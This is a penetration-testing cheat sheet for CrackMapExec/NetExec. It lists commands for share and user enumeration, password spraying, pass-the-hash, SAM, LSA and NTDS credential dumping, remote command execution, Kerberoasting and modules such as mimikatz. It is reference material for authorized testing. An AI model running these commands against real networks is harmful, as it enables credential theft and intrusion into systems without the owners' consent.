# CrackMapExec / NetExec

Swiss army knife for network pentesting (SMB, WinRM, LDAP, SSH, etc.).

> [!NOTE]
> CrackMapExec is being replaced by **NetExec** (nxc). Commands are similar.

## Basic Syntax

```bash
crackmapexec <protocol> <target> [options]
nxc <protocol> <target> [options]
```

---

## SMB

### Enumeration
```bash
# Check if SMB signing is required
crackmapexec smb <target>

# Enumerate shares
crackmapexec smb <target> -u user -p password --shares

# Enumerate users
crackmapexec smb <target> -u user -p password --users

# Enumerate groups
crackmapexec smb <target> -u user -p password --groups

# Enumerate logged-on users
crackmapexec smb <target> -u user -p password --loggedon-users

# Spider shares for files
crackmapexec smb <target> -u user -p password -M spider_plus
```

### Authentication
```bash
# Password
crackmapexec smb <target> -u user -p password

# NTLM hash (Pass-the-Hash)
crackmapexec smb <target> -u user -H <NTLM_hash>

# From files
crackmapexec smb <target> -u users.txt -p passwords.txt
```

### Credential Dumping
```bash
# Dump SAM
crackmapexec smb <target> -u admin -p password --sam

# Dump LSA secrets
crackmapexec smb <target> -u admin -p password --lsa

# Dump NTDS (Domain Controller)
crackmapexec smb <DC_IP> -u admin -p password --ntds
```

### Command Execution
```bash
# Execute command
crackmapexec smb <target> -u admin -p password -x "whoami"

# PowerShell command
crackmapexec smb <target> -u admin -p password -X "Get-Process"
```

---

## Password Spraying

```bash
# Spray single password
crackmapexec smb <target> -u users.txt -p 'Password123' --continue-on-success

# Multiple targets
crackmapexec smb 192.168.1.0/24 -u user -p password

# With hash
crackmapexec smb <target> -u users.txt -H hash --continue-on-success
```

---

## WinRM

```bash
# Check access
crackmapexec winrm <target> -u user -p password

# Execute command
crackmapexec winrm <target> -u user -p password -x "whoami"
crackmapexec winrm <target> -u user -p password -X "Get-Process"
```

---

## LDAP

```bash
# Basic enumeration
crackmapexec ldap <DC_IP> -u user -p password

# Get description field (often contains passwords)
crackmapexec ldap <DC_IP> -u user -p password -M get-desc-users

# Kerberoasting
crackmapexec ldap <DC_IP> -u user -p password --kerberoasting output.txt

# AS-REP Roasting
crackmapexec ldap <DC_IP> -u user -p password --asreproast output.txt
```

---

## Modules

```bash
# List modules
crackmapexec smb -L

# Use specific module
crackmapexec smb <target> -u user -p pass -M <module>

# Common modules:
# spider_plus - spider shares
# mimikatz - run mimikatz
# petitpotam - trigger PetitPotam
# zerologon - check for zerologon
```

---

## Database

CrackMapExec stores results in a local database.

```bash
# Access database
cmedb

# Commands in cmedb
> help
> hosts
> creds
```

---

## Output Options

```bash
# Export to file
crackmapexec smb <target> -u user -p pass --shares -o output.txt

# JSON output
crackmapexec smb <target> -u user -p pass --shares --export output.json
```

---

## Common Workflows

### Find Admin Access
```bash
# Check where you have admin on the network
crackmapexec smb 192.168.1.0/24 -u admin -p password
# Look for "(Pwn3d!)" in output
```

### Password Spray
```bash
# Spray password across domain
crackmapexec smb <DC_IP> -u users.txt -p 'Winter2024!' --continue-on-success
```

### Dump Domain Credentials
```bash
# Dump NTDS from DC
crackmapexec smb <DC_IP> -u domainadmin -p password --ntds
```

### Pass-the-Hash
```bash
# Use NTLM hash instead of password
crackmapexec smb <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash
```

---

## Protocols Summary

| Protocol | Port | Use |
|:---------|:-----|:----|
| `smb` | 445 | File shares, execution |
| `winrm` | 5985/5986 | Remote management |
| `ldap` | 389/636 | AD enumeration |
| `ssh` | 22 | Linux access |
| `mssql` | 1433 | Database access |
| `rdp` | 3389 | Desktop (enum only) |
